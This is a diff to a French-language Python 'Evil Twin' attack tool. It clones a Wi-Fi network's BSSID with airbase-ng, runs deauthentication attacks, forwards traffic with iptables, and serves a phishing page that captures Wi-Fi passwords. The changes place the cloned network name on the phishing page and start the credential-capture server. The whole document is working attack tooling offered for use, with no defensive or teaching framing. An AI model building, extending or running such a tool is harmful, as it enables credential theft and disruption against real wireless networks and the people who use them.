@@ -5,7 +5,7 @@
 EVIL TWIN ULTIME - JATHNIEL EDITION
 ✅ Auto-installation des dépendances
 ✅ Menu CLI interactif
-✅ Page de phishing moderne
+✅ Page de phishing moderne avec SSID dynamique
 ✅ Scan WiFi réel
 ✅ Création AP avec airbase-ng (BSSID cloné)
 ✅ Serveur de capture HTTP
@@ -30,6 +30,7 @@ from pathlib import Path
 from typing import Optional, Dict, List, Any
 import random
 import importlib
+import shutil
 
 # ==================== AUTO-INSTALLATION ====================
 
@@ -38,7 +39,6 @@ REQUIRED_PACKAGES = {
 }
 
 def install_package(package_name: str):
-    """Installe un package Python"""
     print(f"📦 Installation de {package_name}...")
     try:
         subprocess.check_call([sys.executable, '-m', 'pip', 'install', package_name])
@@ -48,9 +48,7 @@ def install_package(package_name: str):
         return False
 
 def check_and_install_dependencies():
-    """Vérifie et installe les dépendances"""
     print("🔍 Vérification des dépendances...")
-    
     missing = []
     for module_name, package_name in REQUIRED_PACKAGES.items():
         try:
@@ -96,7 +94,7 @@ def check_root():
         sys.exit(1)
 
 def check_dependencies():
-    deps = ['airbase-ng', 'aireplay-ng', 'iwconfig', 'airodump-ng']
+    deps = ['airbase-ng', 'aireplay-ng', 'iwconfig', 'airodump-ng', 'macchanger']
     missing = []
     
     for dep in deps:
@@ -105,8 +103,7 @@ def check_dependencies():
     
     if missing:
         print(f"❌ Dépendances système manquantes: {', '.join(missing)}")
-        print("   sudo apt-get install aircrack-ng")
-        print("   sudo apt-get install macchanger")
+        print("   sudo apt-get install aircrack-ng macchanger")
         sys.exit(1)
 
 # ==================== PAGE PHISHING HTML ====================
@@ -597,7 +594,7 @@ PHISHING_HTML = """<!DOCTYPE html>
                 <div class="signal-bar"></div>
                 <div class="signal-bar"></div>
             </div>
-            <span>{SSID}</span>
+            <span id="networkSSID">{SSID}</span>
         </div>
 
         <form id="wifiForm" action="/login" method="POST">
@@ -757,18 +754,22 @@ class PhishingServer:
         self.server = None
         self.thread = None
         self.running = False
-        global PHISHING_HTML
-        PHISHING_HTML = PHISHING_HTML.replace("{SSID}", ssid)
+        self.ssid = ssid
         PhishingHandler.password_callback = password_callback
     
     def start(self):
         if self.running:
             return
+        
+        # Mettre à jour le HTML avec le SSID
+        global PHISHING_HTML
+        PHISHING_HTML = PHISHING_HTML.replace("{SSID}", self.ssid)
+        
         self.running = True
         self.server = socketserver.TCPServer(('0.0.0.0', self.port), PhishingHandler)
         self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
         self.thread.start()
-        print(f"[+] Serveur phishing démarré sur le port {self.port}")
+        print(f"[+] Serveur phishing démarré sur le port {self.port} (SSID: {self.ssid})")
     
     def stop(self):
         self.running = False
@@ -906,8 +907,14 @@ class EvilTwinEngine:
         if stealth:
             self._enable_stealth()
         
-        self.phishing_server = PhishingServer(port=8080, password_callback=self.on_password_captured, ssid=ap_name)
+        # Créer le serveur phishing avec le SSID
+        self.phishing_server = PhishingServer(
+            port=8080, 
+            password_callback=self.on_password_captured, 
+            ssid=ap_name
+        )
         self.phishing_server.start()
+        
         self.start_ap()
         self.enable_ip_forwarding()
         self.setup_iptables()
@@ -1170,6 +1177,7 @@ class EvilTwinCLI:
         
         mode = "Stealth" if stealth else "Normal"
         print(f"✅ Attaque lancée en mode {mode}")
+        print(f"📡 SSID cloné: {net['ssid']}")
     
     def deauth_all(self):
         self.engine.deauth_attack()
@@ -1286,11 +1294,9 @@ class EvilTwinCLI:
 
 if __name__ == "__main__":
     try:
-        # Vérification
         check_root()
         check_dependencies()
         
-        # Menu
         cli = EvilTwinCLI()
         cli.run()
         
